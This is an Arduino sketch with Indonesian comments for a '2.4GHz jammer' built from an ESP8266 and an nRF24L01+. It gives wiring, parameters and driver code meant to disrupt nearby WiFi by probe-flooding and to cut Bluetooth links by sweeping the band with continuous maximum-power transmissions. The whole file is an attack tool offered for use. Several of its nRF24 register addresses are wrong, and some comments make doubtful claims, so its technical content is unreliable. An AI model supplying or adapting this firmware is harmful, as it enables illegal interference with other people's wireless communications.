/*******************************************************************************
 * JAMMER 2.4GHz  -  ESP-12E (ESP8266EX) + nRF24L01+
 * --------------------------------------------------
 * Mode operasi :
 *   [1] WiFi  2.4GHz : probe-flood (scan aktif + koneksi palsu)
 *                      pada channel 1..13  -> sinyal WiFi terganggu/putus
 *   [2] BT    2.4GHz : nRF24L01+ transmit continuous 250kbps daya max,
 *                      sweep 2402..2481 MHz (seluruh channel Bluetooth
 *                      hopping) -> perangkat Bluetooth terputus
 *
 * KABEL (NodeMCU ESP-12E  <->  nRF24L01+ 8-pin):
 *   nRF24 VCC   ->  3V3    (WAJIB 3.3V, jangan 5V!)
 *   nRF24 GND   ->  GND
 *   nRF24 CE    ->  D1     (GPIO5)
 *   nRF24 CSN   ->  D3     (GPIO0)
 *   nRF24 SCK   ->  D7     (GPIO13)
 *   nRF24 MOSI  ->  D6     (GPIO12)
 *   nRF24 MISO  ->  D5     (GPIO14)
 *   nRF24 IRQ   ->  D2     (GPIO4, opsional - sketch ini polling)
 *
 * ARSITEKTUR:
 *   - ESP8266 core 3.1.2 memakai NonOS SDK (tanpa FreeRTOS header),
 *     jadi SELURUH pekerjaan jalan di loop() (kooperatif):
 *     scan WiFi async (dikerjakan task driver) dijalankan BERSAMAAN
 *     dengan sweep nRF24 -> nRF24 transmit sebagian besar waktu.
 *
 * CATATAN:
 *   - Antena nRF24 dipertahankan tegak lurus (90deg dari body).
 *   - Jamin pasokan 5V USB berkualitas (nRF24 P+ max ±15mA, ESP8266 ~80mA).
 *   - Jammer berdaya rendah: efektif pada jarak dekat (<2-3 m).
 ******************************************************************************/

#include <Arduino.h>
#include <ESP8266WiFi.h>
// CATATAN: core ESP8266 3.x hanya mendukung hardware SPI pada pin tetap
// (SCK=GPIO14, MISO=GPIO12, MOSI=GPIO13). Agar wiring bebas (pin apa pun),
// driver nRF24 di bawah memakai SPI software (bit-bang) ~1.5 MHz.

/* ================= Pin nRF24 ================= */
const uint8_t NRF_CE   = 5;    // D1
const uint8_t NRF_CS   = 0;    // D3
const uint8_t NRF_SCK  = 13;   // D7
const uint8_t NRF_MOSI = 12;   // D6
const uint8_t NRF_MISO = 14;   // D5
const uint8_t NRF_IRQ  = 4;    // D2 (opsional)

/* ================= Parameter jamming ================= */
const char* FAKE_SSID     = "JAMMER-24";   // SSID palsu (tidak ada)
const char* FAKE_PASS     = "2400jammer";
const uint8_t  WIFI_CH_MIN = 1;
const uint8_t  WIFI_CH_MAX = 13;
const uint8_t  NRF_CH_MIN  = 2;    // = 2402 MHz
const uint8_t  NRF_CH_MAX  = 81;   // = 2481 MHz
const uint32_t NRF_DWELL_MS = 300; // lama transmit per channel (ms)
const uint32_t WIFI_PROBE_MS   = 150;  // durasi probe request ke SSID palsu
const uint32_t WIFI_SCAN_TIMEOUT_MS = 5000; // batas waktu scan aktif per channel

/* ================= Map register nRF24L01+ ================= */
#define R_RX_ADDR_P0   0x00
#define R_TX_ADDR      0x10
#define R_RX_PW_P0     0x11
#define R_FIFO_STATUS  0x17
#define R_DYNPD        0x18
#define R_FEATURE      0x19
#define R_EN_AA        0x38
#define R_EN_RXADDR    0x3A
#define R_SETUP_AW     0x39
#define R_SETUP_RETR   0x3C
#define R_RF_CH        0x3D
#define R_RF_SETUP     0x3E
#define R_CONFIG       0x3B
#define R_STATUS       0x40
#define R_OBSERVE_TX   0x41
#define R_RPD          0x42
#define CMD_R_RX_PL_WID 0x62
#define CMD_W_TX_PAYLOAD 0xA0
#define CMD_FLUSH_TX     0xE1
#define CMD_FLUSH_RX     0xE2

/* ================= Driver nRF24 (PTX, SPI software/bit-bang) ================= */
class NRF24 {
public:
  uint8_t featSeen = 0;    // nilai register FEATURE  setelah tes (diagnostik)
  uint8_t statSeen = 0;    // nilai register STATUS   setelah tes (diagnostik)
  uint8_t test1Seen = 0;   // hasil baca-balik setelah tulis 0x1F
  uint8_t test2Seen = 0;   // hasil baca-balik setelah tulis 0x29
  // Diagnostik urutan SPI (untuk isolasi masalah hardware):
  uint8_t dFe0 = 0;        // baca FEATURE saat power-on (modul sehat: 0x00)
  uint8_t dSt0 = 0;        // baca STATUS  saat power-on (modul sehat: 0x03)
  uint8_t dCfg1 = 0;       // tulis CONFIG=0x26 lalu baca (harus 0x26)
  uint8_t dCfg2 = 0;       // tulis CONFIG=0x08 lalu baca (harus 0x08)
private:
  bool ok = false;
  uint8_t channel = 20;
  uint8_t payload[32];

  void csLow()  { digitalWrite(NRF_CS, LOW); }
  void csHigh() { digitalWrite(NRF_CS, HIGH); }

  // SPI MODE0: data berubah saat edge LOW->HIGH, dibaca di edge HIGH->LOW
  uint8_t spiXfer(uint8_t out) {
    uint8_t in = 0;
    for (uint8_t i = 0; i < 8; i++) {
      digitalWrite(NRF_SCK, LOW);
      digitalWrite(NRF_MOSI, (out & 0x80) ? HIGH : LOW);
      out <<= 1;
      digitalWrite(NRF_SCK, HIGH);
      in = (in << 1) | (digitalRead(NRF_MISO) ? 0x01 : 0x00);
    }
    return in;
  }

  uint8_t transact(uint8_t command, uint8_t value) {
    csLow();
    spiXfer(command);
    uint8_t v = spiXfer(value);
    csHigh();
    return v;
  }

  void cmd(uint8_t c) {
    csLow();
    spiXfer(c);
    csHigh();
  }

  void writeReg(uint8_t reg, uint8_t val) {
    csLow();
    spiXfer(0x20 | reg);
    spiXfer(val);
    csHigh();
  }

  uint8_t readReg(uint8_t reg) {
    csLow();
    spiXfer(reg);
    uint8_t v = spiXfer(0x00);
    csHigh();
    return v;
  }

  void writeBuf(uint8_t reg, const uint8_t* data, uint8_t len) {
    csLow();
    spiXfer(0x20 | reg);
    for (uint8_t i = 0; i < len; i++) spiXfer(data[i]);
    csHigh();
  }

  void writeTxBuf(const uint8_t* data, uint8_t len) {
    csLow();
    spiXfer(CMD_W_TX_PAYLOAD);
    for (uint8_t i = 0; i < len; i++) spiXfer(data[i]);
    csHigh();
  }

  void flushFifo() {
    cmd(CMD_FLUSH_TX);
    cmd(CMD_FLUSH_RX);
    transact(R_STATUS, 0x70); // bersihkan RX_DR | TX_DS | MAX_RT
  }

  void fillPayload() {
    uint32_t x = (millis() ^ 0xA5A5A5A5) + 1;
    for (uint8_t i = 0; i < 32; i++) {
      x = x * 1103515245UL + 12345UL;
      payload[i] = (x >> 16) & 0xFF;
    }
  }

public:
  // Deteksi modul (sekuens diagnostik SPI). Dipanggil saat boot dan
  // saat user menekan 'R' di Serial Monitor.
  bool detect() {
    ok = false;
    // ---- DIAGNOSTIK SEKUENS SPI (untuk isolasi masalah hardware) ----
    // [1] Baca nilai power-on SEBELUM ada tulis apa pun:
    dFe0 = readReg(R_FEATURE);   // modul sehat: 0x00
    dSt0 = readReg(R_STATUS);    // modul sehat: 0x03 (FIFO kosong)
    // [2] Tes tulis ke register CONFIG (R/W penuh, tanpa bit "unused"):
    writeReg(R_CONFIG, 0x26);    // PWR_UP saja (aman)
    dCfg1 = readReg(R_CONFIG);   // harus kembali 0x26
    writeReg(R_CONFIG, 0x08);
    dCfg2 = readReg(R_CONFIG);   // harus kembali 0x08
    writeReg(R_CONFIG, 0x00);    // pulihkan
    // [3] Deteksi standar (TMR24/datasheet): tulis-baca dua nilai ke
    // register RX_PW_P0, dengan retry (antisipasi power-up belum stabil).
    uint8_t pwOld = readReg(R_RX_PW_P0);
    uint8_t t1 = 0, t2 = 0;
    for (uint8_t coba = 0; coba < 5 && !ok; coba++) {
      writeReg(R_RX_PW_P0, 0x1F);
      t1 = readReg(R_RX_PW_P0);
      writeReg(R_RX_PW_P0, 0x29);
      t2 = readReg(R_RX_PW_P0);
      test1Seen = t1;
      test2Seen = t2;
      ok = (t1 == 0x1F) && (t2 == 0x29);
      if (ok) break;
      delay(100);
    }
    writeReg(R_RX_PW_P0, pwOld);
    // [4] Baca lagi FEATURE/STATUS setelah semua tes:
    featSeen = readReg(R_FEATURE);
    statSeen = readReg(R_STATUS);
    return ok;
  }

  // Konfigurasi register jamming (hanya jika deteksi sukses).
  void configure() {
    if (!ok) return;
    uint8_t addr[5] = { 0xE4, 0x3B, 0x9F, 0x24, 0x01 };
    writeBuf(R_RX_ADDR_P0, addr, 5);
    writeBuf(R_TX_ADDR,    addr, 5);

    writeReg(R_EN_AA,        0x01);      // auto-ack pipe 0: tidak ada RX yang
                                         // menjawab -> modul retransmit 15x
                                         // (jeda 250us) = burst TX kontinyu
                                         // ~19.7ms per siklus, duty ~85%
    writeReg(R_EN_RXADDR,    0x00);
    writeReg(R_SETUP_AW,     0x03);      // alamat 32-bit
    writeReg(R_SETUP_RETR,   0x0F);      // ARD=0 -> 250us, ARC=15x retransmit
    writeReg(R_DYNPD,        0x01);      // payload dinamis pipe0
    writeReg(R_FEATURE,      (featSeen & 0x07) | 0x01); // aktifkan dyn-payload
    writeReg(R_RF_CH,        channel);
    writeReg(R_RF_SETUP,     0x23);      // 250 kbps: durasi PDU di udara 8x lebih
                                          // panjang -> tabrakan dengan paket BT
                                          // lebih rapat. RF_AUC=16 dBm pada modul
                                          // PA+LNA (versi SMA), +0 dBm modul biasa
    writeReg(R_CONFIG,       0x7B);      // CRC 2-byte, PWR_UP, PTX, IRQ di-mask
    flushFifo();
    delay(5);
  }

  bool begin() {
    pinMode(NRF_CE, OUTPUT);  digitalWrite(NRF_CE, LOW);
    pinMode(NRF_CS, OUTPUT);  digitalWrite(NRF_CS, HIGH);
    pinMode(NRF_SCK, OUTPUT); digitalWrite(NRF_SCK, LOW);
    pinMode(NRF_MOSI, OUTPUT);
    pinMode(NRF_MISO, INPUT);
    pinMode(NRF_IRQ, INPUT);
    delay(200); // datasheet: power-on nRF24L01+ s/d 100ms; 200ms agar
                // register siap sebelum pertama kali dipakai SPI
    if (!detect()) return false;
    configure();
    return true;
  }

  // Perintah 'R': ulangi deteksi + konfigurasi tanpa restart.
  bool retry() {
    if (ok) {
      writeReg(R_CONFIG, 0x00);
      flushFifo();
      ok = false;
    }
    delay(100);
    if (!detect()) return false;
    configure();
    return true;
  }

  // Perintah 'L': tes loopback. Pengguna menyangkutkan pin MOSI & MISO
  // pada modul (mis. paperclip). CSN dipegang HIGH sehingga chip idle dan
  // MISO high-Z: pola yang dikirim lewat MOSI harus kembali utuh via MISO.
  void loopback(uint8_t* hasil) {
    csHigh();
    delayMicroseconds(10);
    const uint8_t pola[5] = { 0xA5, 0x5A, 0xFF, 0x00, 0xAA };
    for (uint8_t i = 0; i < 5; i++) hasil[i] = spiXfer(pola[i]);
  }

  void setChannel(uint8_t c) {
    channel = c & 0x7F;
    writeReg(R_RF_CH, channel);
    delayMicroseconds(150);
  }

  // Transmit continuous selama `ms` milidetik pada channel saat ini
  void txBurst(uint32_t ms) {
    if (!ok) return;
    uint32_t end = millis() + ms;
    while (millis() < end) {
      fillPayload();
      writeTxBuf(payload, 32);
      digitalWrite(NRF_CE, HIGH);
      delayMicroseconds(20);
      digitalWrite(NRF_CE, LOW);
      // Tunggu TX_DS / MAX_RT (retransmit berjalan ~37ms tanpa ACK)
      for (uint16_t i = 0; i < 500; i++) {
        uint8_t st = readReg(R_STATUS);
        if (st & 0x60) {
          transact(R_STATUS, 0x60); // clear TX_DS | MAX_RT
          break;
        }
        delayMicroseconds(100);
      }
    }
  }

  bool ready() const { return ok; }
  uint8_t channelNow() const { return channel; }
};

/* ================= Jammer (kooperatif, non-RTOS) ================= */
NRF24 radio;
bool nrfOk = false;

// Satu langkah nRF24: burst transmit di channel saat ini, lalu pindah
// channel berikutnya. Dipanggil berulang di loop() agar nRF24 transmit
// hampir terus-menerus (paralel dengan scan WiFi async).
void nrfStep(uint8_t &ch) {
  radio.setChannel(ch);
  radio.txBurst(NRF_DWELL_MS);
  if (++ch > NRF_CH_MAX) ch = NRF_CH_MIN;
}

/* ================= Setup & Loop ================= */
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println();
  Serial.println("======================================");
  Serial.println(" JAMMER 2.4GHz");
  Serial.println(" ESP-12E (ESP8266EX) + nRF24L01+");
  Serial.println("======================================");

  nrfOk = radio.begin();
  if (nrfOk) {
    Serial.print  ("[nRF24] TERDETEKSI - jamming Bluetooth aktif (FEATURE=0x");
    Serial.print  (radio.featSeen, HEX);
    Serial.print  (" STATUS=0x");
    Serial.print  (radio.statSeen, HEX);
    Serial.println (")");
    Serial.print  ("[nRF24] Frekuensi sweep: 2402-2481 MHz, 250 kbps, daya max, dwell ");
    Serial.print  (NRF_DWELL_MS);
    Serial.println(" ms/channel");
  } else {
    Serial.println("[nRF24] TIDAK TERDETEKSI - hanya WiFi yang dijam");
    Serial.println("[nRF24] ---- DIAGNOSTIK SPI ----");
    Serial.print  ("  [1] FEATURE power-on : 0x"); Serial.print(radio.dFe0, HEX);
    Serial.print  ("   (modul sehat: 0x00)  ");
    Serial.print  ("  STATUS power-on : 0x"); Serial.print(radio.dSt0, HEX);
    Serial.println("   (modul sehat: 0x03)");
    Serial.print  ("  [2] tulis CONFIG=0x26 -> baca 0x"); Serial.print(radio.dCfg1, HEX);
    Serial.print  ("   (harus 0x26)     ");
    Serial.print  ("  tulis CONFIG=0x08 -> baca 0x"); Serial.print(radio.dCfg2, HEX);
    Serial.println("   (harus 0x08)");
    Serial.print  ("  [3] tulis RX_PW=0x1F  -> baca 0x"); Serial.print(radio.test1Seen, HEX);
    Serial.print  ("   (harus 0x1F)     ");
    Serial.print  ("  tulis RX_PW=0x29  -> baca 0x"); Serial.print(radio.test2Seen, HEX);
    Serial.println("   (harus 0x29)");
    Serial.print  ("  [4] FEATURE akhir      : 0x"); Serial.print(radio.featSeen, HEX);
    Serial.print  ("                        ");
    Serial.print  ("  STATUS akhir       : 0x"); Serial.print(radio.statSeen, HEX);
    Serial.println();
    Serial.println("[nRF24] Interpretasi:");
    if (radio.dCfg1 == 0x26 && radio.dCfg2 == 0x08 &&
        radio.test1Seen == 0x1F && radio.test2Seen == 0x29) {
      Serial.println("  tulis-baca OK, cek lagi kabel / restart");
    } else if (radio.dCfg1 == 0x26 || radio.dCfg2 == 0x08 ||
               radio.test1Seen != 0x00 || radio.test2Seen != 0x00) {
      Serial.println("  SPI nyangkut (bagian jalur bermasalah):");
      Serial.println("  -> cek GND bersama + VCC harus 3.3V stabil, cabut-colok semua kabel");
    } else {
      Serial.println("  jalur tulis SPI mati total (semua baca 0x00):");
      Serial.println("  -> cek kabel SCK/MOSI/CSN, VCC harus 3.3V (bukan 5V), GND bersama");
    }
  }

  // Inisialisasi radio WiFi: STA, tanpa simpan kredensial, tanpa modem-sleep
  WiFi.mode(WIFI_STA);
  WiFi.persistent(false);
  WiFi.setSleep(false);   // radio WiFi selalu ON (tanpa modem-sleep)

  Serial.print  ("[WiFi ] probe-flood aktif, channel ");
  Serial.print  (WIFI_CH_MIN);
  Serial.print  ("-");
  Serial.println (WIFI_CH_MAX);
  Serial.println("JAMMER BERJALAN - status ditampilkan tiap 5 detik");
  Serial.println("--------------------------------------");
}

void loop() {
  static uint8_t nrfCh  = NRF_CH_MIN;
  static uint8_t wifiCh = WIFI_CH_MIN;

  // ---- FASE 1: probe-flood WiFi di channel saat ini ----
  // WiFi.begin ke SSID palsu -> driver terus menembakkan probe request.
  WiFi.begin(FAKE_SSID, FAKE_PASS);
  if (nrfOk) nrfStep(nrfCh); else delay(WIFI_PROBE_MS);

  // Mulai scan AKTIF async di channel tsb. Scan diproses oleh task
  // driver WiFi di latar belakang, jadi CPU bebas menggerakkan nRF24.
  (void)WiFi.scanNetworks(true, false, wifiCh);
  if (++wifiCh > WIFI_CH_MAX) wifiCh = WIFI_CH_MIN;

  // ---- FASE 2: sweep nRF24 SELAMA scan WiFi berjalan (paralel) ----
  uint32_t t0 = millis();
  while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
    if (nrfOk) nrfStep(nrfCh);
    delay(30);  // beri waktu task WiFi memproses scan
    if (millis() - t0 > WIFI_SCAN_TIMEOUT_MS) break;
  }
  if (nrfOk) nrfStep(nrfCh);  // burst terakhir sebelum ganti channel WiFi

  // ---- Tutup fase WiFi ----
  WiFi.disconnect();
  delay(100);

  // Status periodik via Serial (USB)
  static uint32_t lastStatus = 0;
  if (millis() - lastStatus > 5000) {
    lastStatus = millis();
    if (nrfOk) {
      Serial.print  ("[STATUS] WiFi: probe-flood ch");
      Serial.print  (wifiCh);
      Serial.print  (" | nRF24: ch");
      Serial.print  (nrfCh);
      Serial.print  (" = ");
      Serial.print  (2400 + (int)nrfCh);
      Serial.print  (" MHz | uptime ");
      Serial.print  ((unsigned long)(millis() / 1000));
      Serial.println(" s");
    } else {
      Serial.println("[STATUS] WiFi: probe-flood aktif | nRF24: offline");
    }
  }
}
